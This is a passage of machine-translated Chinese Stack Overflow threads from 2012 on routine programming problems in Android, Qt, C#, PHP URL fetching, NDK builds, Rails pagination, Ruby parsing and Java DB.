        final Dialog dialog = new Dialog(activity);
        dialog.setContentView(R.layout.custom_dialog);
        dialog.setTitle(R.string.success);
        dialog.setCancelable(true);
        //there are a lot of settings, for dialog, check them all out!

        //set up text
        TextView text = (TextView) dialog.findViewById(R.id.questTitle);
        Log.i("INFO", cur.getString(0));
        text.setText(cur.getString(0));

        //set up image view
        //ImageView img = (ImageView) dialog.findViewById(R.id.ImageView01);
        //img.setImageResource(R.drawable.nista_logo);

        //set up button
        Button button = (Button) dialog.findViewById(R.id.button1);
        button.setOnClickListener(new OnClickListener() {
            @Override
            public void onClick(View v) {
                dialog.dismiss();
            }
        });
        //now that the dialog is set up, it's time to show it    
        dialog.show();
    }
} 
```

接下来我的Logcat：

```
04-11 07:58:03.753: I/INFO(578): opened db
04-11 07:58:04.023: I/INFO(578): db already exists
04-11 07:58:12.203: D/dalvikvm(578): GC_FOR_MALLOC freed 5170 objects / 286304 bytes in 66ms
04-11 07:58:12.223: I/INFO(578): Seek Out a Space Phenomenon
04-11 07:58:12.223: D/AndroidRuntime(578): Shutting down VM
04-11 07:58:12.233: W/dalvikvm(578): threadid=1: thread exiting with uncaught exception (group=0x4001d800)
04-11 07:58:12.233: E/AndroidRuntime(578): FATAL EXCEPTION: main
04-11 07:58:12.233: E/AndroidRuntime(578): java.lang.NullPointerException
04-11 07:58:12.233: E/AndroidRuntime(578):  at com.nikopiko.spacelords.QuestsAdapter.onClick(QuestsAdapter.java:96)
04-11 07:58:12.233: E/AndroidRuntime(578):  at android.view.View.performClick(View.java:2408)
04-11 07:58:12.233: E/AndroidRuntime(578):  at android.view.View$PerformClick.run(View.java:8816)
04-11 07:58:12.233: E/AndroidRuntime(578):  at android.os.Handler.handleCallback(Handler.java:587)
04-11 07:58:12.233: E/AndroidRuntime(578):  at android.os.Handler.dispatchMessage(Handler.java:92)
04-11 07:58:12.233: E/AndroidRuntime(578):  at android.os.Looper.loop(Looper.java:123)
04-11 07:58:12.233: E/AndroidRuntime(578):  at android.app.ActivityThread.main(ActivityThread.java:4627)
04-11 07:58:12.233: E/AndroidRuntime(578):  at java.lang.reflect.Method.invokeNative(Native Method)
04-11 07:58:12.233: E/AndroidRuntime(578):  at java.lang.reflect.Method.invoke(Method.java:521)
04-11 07:58:12.233: E/AndroidRuntime(578):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:868)
04-11 07:58:12.233: E/AndroidRuntime(578):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:626)
04-11 07:58:12.233: E/AndroidRuntime(578):  at dalvik.system.NativeStart.main(Native Method) 
```

# c++ - 如何在跨平台下通过多线程在Qt中写入同一文件的不同区域？

> ID：10102169
> 
> 赞同：0
> 
> 时间：2012-04-11T08:08:12.333
> 
> 标签：c++, multithreading, macos, qt, cross-platform

我需要一个跨平台的多线程解决方案来同时写入同一个文件**，**至少是 Windows 和 Mac OS X。不同的线程写入不同的文件区域。

文件有点大。可能是几 GB 或几百 MB。所以MMF不合适。

QFile 是一个跨平台的重叠。我已经搜索了 QFile 文档，没有共享写入选项。

在 Windows 下，这可以通过 CreateFile 使用 FILE_SHARE_WRITE 选项来完成。Mac OS X 呢？

Qt 支持这个还是我应该自己封装？如何在 Mac OS X 下做到这一点？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T08:38:55.433

您可以使用`QFile`（`QReadWriteLock`文档[）](http://doc.qt.nokia.com/4.7-snapshot/qreadwritelock.html)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T10:31:51.943

在 Mac OS X 上，多个进程或线程打开一个文件并在其中写入是没有障碍的，除非这些进程或线程特别选择了协作锁定方案。这种选择加入的合作锁定方案称为“咨询锁定”。例如，[`flock()`](https://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man2/flock.2.html)用于锁定整个文件和[fcntl()](https://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man2/fcntl.2.html)用于字节范围锁定。

根据`QFile`实现方式，它可能允许按原样进行多线程编写。它必须采取特殊步骤来禁止它。

当然，如果线程或进程不通过某种方式进行协调，那么它们就会冒着覆盖和破坏彼此数据的风险。

# android - android中的选项卡更改侦听器

> ID：10102171
> 
> 赞同：0
> 
> 时间：2012-04-11T08:08:21.707
> 
> 标签：android, tabs

我做了三个标签。

Language.（包括语言布局的语言类）激活（包括激活布局的激活类）设置（包括设置布局的设置类）

在设置列表中，如果我更改设置以隐藏语言布局中的单词定义。而不是再次单击选项卡语言单词翻译仍然存在。

我想我必须在这里申请标签更改列表。

但是我应该在选项卡更改列表中做什么。

那是我的 TabActivity。

```
 package com.languagetranslate;

import com.languagetranslate.Constants.Constants;
import com.languagetranslate.dao.UserData;

import android.app.Activity;
import android.app.TabActivity;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.os.Bundle;
import android.view.LayoutInflater;
import android.view.View;
import android.widget.FrameLayout;
import android.widget.ListView;
import android.widget.RelativeLayout;
import android.widget.TabHost;
import android.widget.TextView;
import android.widget.TabHost.OnTabChangeListener;

public class Screen1 extends TabActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        // TODO Auto-generated method stub
        super.onCreate(savedInstanceState);
        setContentView(R.layout.screen1);

        initializeTabs();
    }

    private void initializeTabs() {
        TabHost tabHost = getTabHost(); // The activity TabHost
        TabHost.TabSpec spec; // Resusable TabSpec for each tab
        Intent intent; // Reusable Intent for each tab

        // Create an Intent to launch an Activity for the tab (to be reused)
        intent = new Intent().setClass(this, WordsClass.class);

        // Initialize a TabSpec for each tab and add it to the TabHost
        spec = tabHost.newTabSpec("Words").setIndicator("Words")
                .setContent(intent);
        tabHost.addTab(spec);

        // Do the same for the other tabs
        intent = new Intent().setClass(this, ActivateClass.class);
        spec = tabHost.newTabSpec("Activitation").setIndicator("Activitation")
                .setContent(intent);
        tabHost.addTab(spec);

        // Do the same for the other tabs
        intent = new Intent().setClass(this, Settings.class);
        spec = tabHost.newTabSpec("Settings").setIndicator(".\n.\n.")
                .setContent(intent);
        tabHost.addTab(spec);

        tabHost.setCurrentTab(2);

        tabHost.setOnTabChangedListener(new OnTabChangeListener() {

            public void onTabChanged(String tabId) {

                if ( tabId == "Language" ){

                    Constants.TAGS_ENABLE = UserData.getTagSettings(getApplicationContext(),
                            Constants.SETTINGS_FILE);
                    if (Constants.TAGS_ENABLE == true) {
                        LayoutInflater inflate = (LayoutInflater) getSystemService(Context.LAYOUT_INFLATER_SERVICE);
                        FrameLayout item = (FrameLayout)findViewById(android.R.id.tabcontent);
                        View child = inflate.inflate(R.layout.wordlayout, null);
                            child.findViewById(R.id.availabletags).setVisibility(View.VISIBLE);
                            child.findViewById(R.id.tags).setVisibility(View.VISIBLE);

                            item.addView(child);
//                      
//                      ((TextView) findViewById(R.id.availabletags))
//                              .setVisibility(View.VISIBLE);
//                      ((ListView) findViewById(R.id.tags))
//                              .setVisibility(View.VISIBLE);

                    }

                }

            }
        });
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-11T08:27:59.313

也许你可以把它们放在语言的 onResume() 中：

```
@Override
protected void onResume()
{
    super.onResume();
    if (Constants.TAGS_ENABLE == true) {
        // set visibility...
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:34:47.543

您只需要覆盖`onResume()`语言活动并检查更改的设置，如果是这样，您可以将逻辑隐藏翻译。

onResume 将在用户输入进入 Activity 时被调用，因此，

```
protected void onResume()
{
super.onResume();
if(settings_changed)
//logic here

} 
```

您可能还想实现 onPause() 方法。

# random - 最佳随机性方程

> ID：10102172
> 
> 赞同：-2
> 
> 时间：2012-04-11T08:08:24.687
> 
> 标签：random

我必须根据当前的随机生成标准编写一个算法。我的意思是，我必须选择一个现有的并结合各种因素（可能是通过学习现有事实）。那么开始阅读随机生成器的最佳位置是什么。我知道 Wiki，但为了有一个有限的起点，我必须阅读一些文章或论文。此外，我需要一个快速的开始。目前现有的随机生成器有哪些，它们考虑了哪些因素？把事实强加给它有多可行？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:14:55.090

如果您不知道自己在做什么（您的问题听起来不像是 L'Ecuyer 或 Marsaglia 之类的人），请远离修改或组合 PRNG。你更有可能损害发电机的质量而不是改善它。

如果您谈论的是密码学 PRNG，这个建议甚至更有效。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:30:17.327

当前算法不生成**随机**数。它们生成**伪**随机数。这不是一回事。

**随机**数通常可以使用某种硬件从自然界中获得。例如，如果您从经过调谐以接收大气噪声的 FM 调谐器读取声级，则数字将是非常随机的。这种生成器的示例是[random.org](http://www.random.org/)。您还可以实现掷骰子或掷硬币的机器人或[类似的东西](http://en.wikipedia.org/wiki/Hardware_random_number_generator)。在 linux 上，您可以使用 /dev/random 来使用用户生成随机事件。

为了确定**伪**随机数生成器是否产生可用于加密的高质量随机性，PRNG 生成的数据应通过诸如此类的 prng[测试](http://csrc.nist.gov/groups/ST/toolkit/rng/index.html)。这并不容易，许多 PRNG 都惨遭失败。产生相对高质量的**伪**随机数同时又易于实现的算法之一是[XorShift](http://en.wikipedia.org/wiki/Xorshift)。然而，简单的实现并不意味着很容易理解这个特定生成器背后的[逻辑。](http://www.jstatsoft.org/v08/i14/paper)

> 此外，我需要一个快速的开始。

与每个主题一样，快速入门将是访问维基百科并开始阅读该主题的所有参考资料，或者谷歌搜索。到目前为止，您似乎还没有尝试这样做。

> 我知道维基

不，你没有。如果您“了解 wiki”，您就会知道每篇文章的末尾都有用于撰写文章的来源列表。阅读来源。

# c# - 如何继承父类的一些属性

> ID：10102182
> 
> 赞同：0
> 
> 时间：2012-04-11T08:09:07.230
> 
> 标签：c#, oop, class, c#-4.0, object

请考虑这种情况：

我们有一个名为的基类`clsMain`：

```
class clsMain
{
    int P1{set; get;}
    int P2{set; get;}
    int P3{set; get;}
    string P4{set; get;}
    string P5{set; get;}
} 
```

我想从以下位置获得这两个对象`clsMain`：

```
object1 psudo code:
{
    int P1{set; get;}
    int P2{set; get;}
    int P3{set; get;}    
} 
```

和 ：

```
object2 psudo code:
{
    int P3{set; get;}
    string P4{set; get;}
    string P5{set; get;}
} 
```

在c#中可能吗？我应该使用特定类型的类（抽象，...）吗？

多谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T08:14:58.627

在这种情况下，在基类中只保留*共享*属性，如下面的伪代码：

```
class clsMain
{   
    int P3{set; get;}   
}

class object1 : clsMain
{
    int P1{set; get;}
    int P2{set; get;}   
}

class object2 : clsMain
{    
    string P4{set; get;}
    string P5{set; get;}
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T08:17:04.433

在 C# 中，继承是可能的，作为一流的概念：

```
public class BaseClass
{
    public virtual string Name { get { return "Adam"; } }
}

public class ChildClass : BaseClass
{
    public override string Name { get { return "Foo"; } }
} 
```

对于`override`某些东西，您需要实现它`virtual`并且需要具有除`private`.

在您的情况下，您可能会执行以下操作：

```
class clsMain
{
    public virtual int P1{set; get;}
    public virtual int P2{set; get;}
    public virtual int P3{set; get;}
    public virtual string P4{set; get;}
    public virtual string P5{set; get;}
}

class object1 : clsMain
{
    public override int P1{set; get;}
    public override int P2{set; get;}
    public override int P3{set; get;}    
}

class object2 : clsMain
{
    public override int P3{set; get;}
    public override string P4{set; get;}
    public override string P5{set; get;}
} 
```

虽然如果我说实话，你的问题不是很清楚。但是请注意，C# 不支持类的多重继承。

听起来你想过滤掉属性。您不能阻止继承的成员被访问（嗯，有`new`修饰符，但这充其量只是粗略）。相反，您可以使用接口：

```
interface Iobject1
{
    int P1 { set; get; }
    int P2 { set; get; }
    int P3 { set; get; } 
}

interface Iobject2
{
    int P3{set; get;}
    string P4{set; get;}
    string P5{set; get;}
}

class clsMain : Iobject1, Iobject2
{
    public int P1{set; get;}
    public int P2{set; get;}
    public int P3{set; get;}
    public string P4{set; get;}
    public string P5{set; get;}
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-11T08:14:48.973

您的问题不清楚...您不能从 C# 中的 2 个对象继承

如果您希望 clsMain 具有从 object1 和 object2 继承的所有属性，您可以做的是：

*   object2 继承自 object1
*   clsMain 继承自 object2

所以 clsMain 将拥有来自 object1 和 object2 的所有属性

使用抽象只是保护类不被直接创建。如果您将 object1 作为抽象对象，您将永远无法执行“var x = new object1();”

编辑：我忘了说属性必须是受保护的或公共的，否则它们不能从派生类中访问。

# php - 如何安全地从用户输入中转义 URL 以在 file_get_contents 中使用？

> ID：10102189
> 
> 赞同：1
> 
> 时间：2012-04-11T08:09:48.023
> 
> 标签：php, url, escaping, file-get-contents, sanitize

我有一个简单的问题。用户向我的 PHP 脚本提供 URL，我从 URL 中获取页面并解析它并向用户显示一些片段。现在我想清理或更好地转义 URL，这样我就可以安全地使用 file_get_contents() 来获取它。

我的简化代码如下所示：

```
$url = $_POST['url'];
$html = file_get_contents($url); 
```

我想到的第一件事是使用正则表达式来捕获邪恶的 URL，但我认为它效率不高，最好是转义整个 URL。但是我可以使用什么 PHP 函数来转义 URL 以在 file_get_contents() 函数中使用？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T08:11:24.920

您可以简单地要求 url 以`http://`or开头`https://`。

幸运的是，PHP 足够聪明，不会跟随重定向到`file://`url。
但是，它**确实**会重定向到`ftp://`url，因此您最好确保您的服务器在未经身份验证的情况下无法访问任何内部 ftp 服务器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-11T08:33:12.773

如果你想做正则表达式，看看这里：

Stackoverflow：[检查字符串是否为有效 URL 的最佳正则表达式是什么？](https://stackoverflow.com/questions/161738/what-is-the-best-regular-expression-to-check-if-a-string-is-a-valid-url)

# android - 关于通过android工具链（NDK）构建保险丝

> ID：10102191
> 
> 赞同：0
> 
> 时间：2012-04-11T08:09:54.167
> 
> 标签：android, android-ndk, fuse

我打算通过 NDK 1.7 将 fuse 2.8.7 移植到 android 中，首先，我应该通过 android 工具链构建 fuse 项目，然后将其作为模块注入到 android 内核中。但不幸的是，我在编译过程中遇到了一些问题。以下是详细信息： 1：在 fuse 2.8.7 项目文件夹中，我构建了一个 shell 脚本，如下所示：

```
#!/bin/sh
# Compiles fftw3 for Android
export NDK_ROOT="/home/kaiwii/android_related/android-ndk-r7b"
export PATH="$NDK_ROOT/toolchains/arm-linux-androideabi-4.4.3/prebuilt/linux-x86/bin/:$PATH"
export SYS_ROOT="$NDK_ROOT/platforms/android-14/arch-arm/"
export CC="arm-linux-androideabi-gcc --sysroot=$SYS_ROOT"
export LD="arm-linux-androideabi-ld"
export AR="arm-linux-androideabi-ar"
export RANLIB="arm-linux-androideabi-ranlib"
export STRIP="arm-linux-androideabi-strip"

./configure --host=arm-eabi  LIBS="-lc -lgcc"

make
make install

exit 0 
```

2、编译项目，提示如下错误：

```
In file included from fuse_i.h:9,
                 from fuse.c:13:
../include/fuse.h:33:25: error: sys/statvfs.h: No such file or directory
In file included from fuse_i.h:9,
                 from fuse.c:13:
../include/fuse.h:207: warning: 'struct statvfs' declared inside parameter list
../include/fuse.h:207: warning: its scope is only this definition or declaration, which is probably not what you want
../include/fuse.h:721: warning: 'struct statvfs' declared inside parameter list
In file included from fuse_i.h:10,
                 from fuse.c:13:
../include/fuse_lowlevel.h:1021: warning: 'struct statvfs' declared inside parameter list
In file included from fuse.c:13:
fuse_i.h:29: error: expected specifier-qualifier-list before 'pthread_mutex_t'
fuse_i.h:60: error: expected specifier-qualifier-list before 'pthread_mutex_t'
In file included from fuse.c:18:
../include/fuse_compat.h:32: warning: 'struct statvfs' declared inside parameter list
fuse.c:1036: warning: 'struct statvfs' declared inside parameter list
fuse.c: In function 'convert_statfs_compat':
fuse.c:1038: error: dereferencing pointer to incomplete type
fuse.c:1039: error: dereferencing pointer to incomplete type
fuse.c:1040: error: dereferencing pointer to incomplete type
fuse.c:1041: error: dereferencing pointer to incomplete type
fuse.c:1042: error: dereferencing pointer to incomplete type
fuse.c:1043: error: dereferencing pointer to incomplete type
fuse.c:1044: error: dereferencing pointer to incomplete type
fuse.c: At top level:
fuse.c:1047: warning: 'struct statvfs' declared inside parameter list
fuse.c: In function 'convert_statfs_old':
fuse.c:1049: error: dereferencing pointer to incomplete type
fuse.c:1050: error: dereferencing pointer to incomplete type
fuse.c:1051: error: dereferencing pointer to incomplete type
fuse.c:1052: error: dereferencing pointer to incomplete type
fuse.c:1053: error: dereferencing pointer to incomplete type
fuse.c:1054: error: dereferencing pointer to incomplete type
fuse.c:1055: error: dereferencing pointer to incomplete type
fuse.c: At top level:
fuse.c:1059: warning: 'struct statvfs' declared inside parameter list
fuse.c: In function 'fuse_compat_statfs':
fuse.c:1064: warning: passing argument 2 of 'fs->op.statfs' from incompatible pointer type
fuse.c:1064: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c:1070: warning: passing argument 2 of 'convert_statfs_old' from incompatible pointer type
fuse.c:1047: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c:1077: warning: passing argument 2 of 'convert_statfs_compat' from incompatible pointer type
fuse.c:1035: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c: At top level:
fuse.c:1376: warning: 'struct statvfs' declared inside parameter list
fuse.c:1376: error: conflicting types for 'fuse_fs_statfs'
../include/fuse.h:721: note: previous declaration of 'fuse_fs_statfs' was here
fuse.c: In function 'fuse_fs_statfs':
fuse.c:1383: warning: passing argument 3 of 'fuse_compat_statfs' from incompatible pointer type
fuse.c:1058: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c:1385: error: dereferencing pointer to incomplete type
fuse.c:1386: error: dereferencing pointer to incomplete type
fuse.c: In function 'fuse_lib_statfs':
fuse.c:2878: error: storage size of 'buf' isn't known
fuse.c:2878: warning: unused variable 'buf'
fuse.c: In function 'locks_insert':
fuse.c:3056: warning: comparison is always true due to limited range of data type
fuse.c: In function 'lock_to_flock':
fuse.c:3138: warning: comparison is always false due to limited range of data type
make[1]: *** [fuse.lo] Error 1
make[1]: Leaving directory `/home/kaiwii/test/fuse-2.8.7/lib'
make: *** [all-recursive] Error 1
Making install in include
make[1]: Entering directory `/home/kaiwii/test/fuse-2.8.7/include'
make[2]: Entering directory `/home/kaiwii/test/fuse-2.8.7/include'
make[2]: Nothing to be done for `install-exec-am'.
test -z "/usr/local/include/fuse" || /bin/mkdir -p "/usr/local/include/fuse"
 /usr/bin/install -c -m 644 fuse.h fuse_compat.h fuse_common.h fuse_common_compat.h fuse_lowlevel.h fuse_lowlevel_compat.h fuse_opt.h cuse_lowlevel.h '/usr/local/include/fuse'
test -z "/usr/local/include" || /bin/mkdir -p "/usr/local/include"
 /usr/bin/install -c -m 644 old/fuse.h ulockmgr.h '/usr/local/include'
make[2]: Leaving directory `/home/kaiwii/test/fuse-2.8.7/include'
make[1]: Leaving directory `/home/kaiwii/test/fuse-2.8.7/include'
Making install in lib
make[1]: Entering directory `/home/kaiwii/test/fuse-2.8.7/lib'
/bin/bash ../libtool --tag=CC   --mode=compile arm-linux-androideabi-gcc --sysroot=/home/kaiwii/android_related/android-ndk-r7b/platforms/android-14/arch-arm/ -DHAVE_CONFIG_H -I. -I../include  -I../include -DFUSERMOUNT_DIR=\"/usr/local/bin\" -D_FILE_OFFSET_BITS=64 -D_REENTRANT -DFUSE_USE_VERSION=26   -Wall -W -Wno-sign-compare -Wstrict-prototypes -Wmissing-declarations -Wwrite-strings -g -O2 -fno-strict-aliasing -MT fuse.lo -MD -MP -MF .deps/fuse.Tpo -c -o fuse.lo fuse.c
libtool: compile:  arm-linux-androideabi-gcc --sysroot=/home/kaiwii/android_related/android-ndk-r7b/platforms/android-14/arch-arm/ -DHAVE_CONFIG_H -I. -I../include -I../include -DFUSERMOUNT_DIR=\"/usr/local/bin\" -D_FILE_OFFSET_BITS=64 -D_REENTRANT -DFUSE_USE_VERSION=26 -Wall -W -Wno-sign-compare -Wstrict-prototypes -Wmissing-declarations -Wwrite-strings -g -O2 -fno-strict-aliasing -MT fuse.lo -MD -MP -MF .deps/fuse.Tpo -c fuse.c -o fuse.o
In file included from fuse_i.h:9,
                 from fuse.c:13:
../include/fuse.h:33:25: error: sys/statvfs.h: No such file or directory
In file included from fuse_i.h:9,
                 from fuse.c:13:
../include/fuse.h:207: warning: 'struct statvfs' declared inside parameter list
../include/fuse.h:207: warning: its scope is only this definition or declaration, which is probably not what you want
../include/fuse.h:721: warning: 'struct statvfs' declared inside parameter list
In file included from fuse_i.h:10,
                 from fuse.c:13:
../include/fuse_lowlevel.h:1021: warning: 'struct statvfs' declared inside parameter list
In file included from fuse.c:13:
fuse_i.h:29: error: expected specifier-qualifier-list before 'pthread_mutex_t'
fuse_i.h:60: error: expected specifier-qualifier-list before 'pthread_mutex_t'
In file included from fuse.c:18:
../include/fuse_compat.h:32: warning: 'struct statvfs' declared inside parameter list
fuse.c:1036: warning: 'struct statvfs' declared inside parameter list
fuse.c: In function 'convert_statfs_compat':
fuse.c:1038: error: dereferencing pointer to incomplete type
fuse.c:1039: error: dereferencing pointer to incomplete type
fuse.c:1040: error: dereferencing pointer to incomplete type
fuse.c:1041: error: dereferencing pointer to incomplete type
fuse.c:1042: error: dereferencing pointer to incomplete type
fuse.c:1043: error: dereferencing pointer to incomplete type
fuse.c:1044: error: dereferencing pointer to incomplete type
fuse.c: At top level:
fuse.c:1047: warning: 'struct statvfs' declared inside parameter list
fuse.c: In function 'convert_statfs_old':
fuse.c:1049: error: dereferencing pointer to incomplete type
fuse.c:1050: error: dereferencing pointer to incomplete type
fuse.c:1051: error: dereferencing pointer to incomplete type
fuse.c:1052: error: dereferencing pointer to incomplete type
fuse.c:1053: error: dereferencing pointer to incomplete type
fuse.c:1054: error: dereferencing pointer to incomplete type
fuse.c:1055: error: dereferencing pointer to incomplete type
fuse.c: At top level:
fuse.c:1059: warning: 'struct statvfs' declared inside parameter list
fuse.c: In function 'fuse_compat_statfs':
fuse.c:1064: warning: passing argument 2 of 'fs->op.statfs' from incompatible pointer type
fuse.c:1064: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c:1070: warning: passing argument 2 of 'convert_statfs_old' from incompatible pointer type
fuse.c:1047: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c:1077: warning: passing argument 2 of 'convert_statfs_compat' from incompatible pointer type
fuse.c:1035: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c: At top level:
fuse.c:1376: warning: 'struct statvfs' declared inside parameter list
fuse.c:1376: error: conflicting types for 'fuse_fs_statfs'
../include/fuse.h:721: note: previous declaration of 'fuse_fs_statfs' was here
fuse.c: In function 'fuse_fs_statfs':
fuse.c:1383: warning: passing argument 3 of 'fuse_compat_statfs' from incompatible pointer type
fuse.c:1058: note: expected 'struct statvfs *' but argument is of type 'struct statvfs *'
fuse.c:1385: error: dereferencing pointer to incomplete type
fuse.c:1386: error: dereferencing pointer to incomplete type
fuse.c: In function 'fuse_lib_statfs':
fuse.c:2878: error: storage size of 'buf' isn't known
fuse.c:2878: warning: unused variable 'buf'
fuse.c: In function 'locks_insert':
fuse.c:3056: warning: comparison is always true due to limited range of data type
fuse.c: In function 'lock_to_flock':
fuse.c:3138: warning: comparison is always false due to limited range of data type
make[1]: *** [fuse.lo] Error 1
make[1]: Leaving directory `/home/kaiwii/test/fuse-2.8.7/lib'
make: *** [install-recursive] Error 1 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-27T14:35:03.787

尝试通过以下方式替换 fuse.h 中包含的 sys/statvfs.h：

```
#ifndef ANDROID
#  include <sys/statvfs.h>
#else
#  include <sys/vfs.h>
#  define statvfs statfs
#endif 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-03T10:39:40.897

我相信您需要 android 内核头文件来构建模块，并且 NDK 绝对不**包含**android 内核头文件。看看[安卓NDK能编译内核模块源码吗？](https://stackoverflow.com/questions/4865469/can-the-android-ndk-compile-kernel-module-source)有关为 Android 编译内核模块的更多信息的链接。但是请注意。由于信息较少（例如，哪个编译器编译了您正在构建模块的内核等），与 Linux 相比，这是一个为 Android 编译内核模块的世界。

# ruby-on-rails-3 - 使用 Kaminari gem 为对象数组进行 Ruby on Rails 分页

> ID：10102192
> 
> 赞同：0
> 
> 时间：2012-04-11T08:09:55.030
> 
> 标签：ruby-on-rails-3, activerecord, pagination, kaminari

我正在尝试做过滤部分。过滤是指，当用户根据该产品的详细信息选择一些选项时，将被显示出来。如果用户选择女性（部门）和男性部门，它应该显示属于女性和男性的所有产品。为此，我使用太阳黑子并连接两个对象。它工作正常。但是，当我尝试使用 Kaminari 进行分页时，如果用户只选择像女性这样的一个部门，它就可以正常工作。

如果用户同时选择男性和女性，则会引发如下错误：

> 数组的未定义方法“current_page”

我正在做上面提到的工作，如下面的代码。

```
deptids=["1" "2"]
deptids.each do |did|
    @search_res=ProductDetail.search do
        with :department_id, did                  
        paginate :page=>params[:page], :per_page=>15
    end
end 
```

请任何人都可以告诉如何使用 Kaminari Gem 对对象数组进行分页？

请告诉我如何使用 Kaminari 对对象数组进行分页或如何将两个对象附​​加到一个对象中

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-12T02:31:21.773

[我在这个 Stackoverflow 链接](https://stackoverflow.com/questions/6545990/rails-3-kaminari-pagination-for-an-simple-array)的帮助下解决了这个问题。

我更改的代码在 product_details 控制器中

```
def index
    count=ProductDetail.count
    deptids=["1" "2"]
    deptids.each do |did|
        @search_res=ProductDetail.search do
            with :department_id, did    
            paginate :page=>1, :per_page=>count
        end
    end
    if @products.present?
        unless @products.kind_of?(Array)
          @products = @products.page(params[:page]).per(30)
        else
          @products = Kaminari.paginate_array(@products).page(params[:page]).per(30)
        end
    end
end 
```

在视图_index.html.erb

```
<%= paginate @products, :remote=>true %> 
```

# ruby - int 字符串和范围到 int 数组（寻求改进）

> ID：10102194
> 
> 赞同：2
> 
> 时间：2012-04-11T08:10:15.400
> 
> 标签：ruby

首先，我有什么：

> s = "1,3..5,8"

我想要的是：

> [“1”、“3”、“4”、“5”、“8”]

我找到了一种方法如下

```
r = s.split(/\s?,\s?/)
=> ["10", "12..15", "17", "
r.map do |c|
  if Fixnum === eval(c)
    c
  else
    eval(c).map(&:to_s).flatten
  end
end
=> ["10", "12", "13", "14", "15", "17", "18"] 
```

会有更好的方法来实现这一目标吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T08:21:13.003

我不会使用`eval`.

稍微好一点的方法是：

```
s = "1,3...5,8"
p s.split(',').map { |n|
  if n.scan('...').empty?
    n
  else
    Range.new(*n.split('...', 2)).to_a
  end
}.flatten
# => ["1", "3", "4", "5", "8"] 
```

编辑：修复了@fl00r 建议的代码以使用多个数字。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-11T09:11:02.050

```
def magick(str)
  str.split(",").map do |item|
    item.scan(/(\d+)(\.+)(\d+)/)
    if $1
      Range.new($1.to_i, $3.to_i, $2 == "...").to_a
    else
      item.to_i
    end
  end.flatten
end

s1 = "1,3..5,8"
s2 = "1,3...5,8,20,100, 135"
magick(s1)
#=> [1, 3, 4, 5, 8]
magick(s2)
#=> [1, 3, 4, 8, 20, 100, 135] 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T09:51:15.007

```
s = "10,12...15,17" 
s.split(',').map { |n| n['...'] ? Range.new(*n.split('...', 2)).to_a : n}.flatten 
#=> ["10", "12", "13", "14", "15", "17"] 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-11T11:41:17.637

这种方式怎么样：

```
s='1,2..6,10'

s.split(',').map { |e| e.strip.include?('..') ? eval("(#{e}).to_a") : e.to_i }.flatten 
```

# telerik - 未填充实时数据

> ID：10102204
> 
> 赞同：0
> 
> 时间：2012-04-11T08:10:58.413
> 
> 标签：telerik, rotator

我正在尝试根据以下演示进行实时更新。 [https://demos.telerik.com/aspnet-ajax/rotator/examples/livexml/defaultcs.aspx](https://demos.telerik.com/aspnet-ajax/rotator/examples/livexml/defaultcs.aspx.But)。但是在更新xml之后，radrotator如何显示更新的值？。我得到了更新的值。这怎么可能？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T15:46:39.943

您需要启动回发或 Ajax 请求并重新绑定 RadRotator 以便在控件中显示更新的数据。

# java - 启动嵌入式 Java DB：在获取 configuration.properties 时获取 NullPointerException

> ID：10102207
> 
> 赞同：0
> 
> 时间：2012-04-11T08:11:04.157
> 
> 标签：java

再会！

我是使用 Java DB (Derby) 的新手。我想将它嵌入到我的应用程序中。我找到了这个网站 (http://java.sun.com/developer/technicalArticles/J2SE/Desktop/javadb/) 并按照说明进行操作。我复制了部分示例代码并进行了编辑以适合我的班级。

当我运行该类时，它返回此错误：

```
Exception in thread "AWT-EventQueue-0" java.lang.NullPointerException
at java.util.Properties$LineReader.readLine(Properties.java:435)
at java.util.Properties.load0(Properties.java:354)
at java.util.Properties.load(Properties.java:342)
at recordbook.ui.RecordBookDAO.loadDBProperties(RecordBookDAO.java:40)
at recordbook.ui.RecordBookDAO.<init>(RecordBookDAO.java:28)
at recordbook.ui.RecordBook.<init>(RecordBook.java:34)
at recordbook.ui.RecordBookUI.<init>(RecordBookUI.java:23)
at recordbook.ui.RecordBookUI$3.run(RecordBookUI.java:214)
at java.awt.event.InvocationEvent.dispatch(InvocationEvent.java:226)
at java.awt.EventQueue.dispatchEventImpl(EventQueue.java:647)
at java.awt.EventQueue.access$000(EventQueue.java:96)
at java.awt.EventQueue$1.run(EventQueue.java:608)
at java.awt.EventQueue$1.run(EventQueue.java:606)
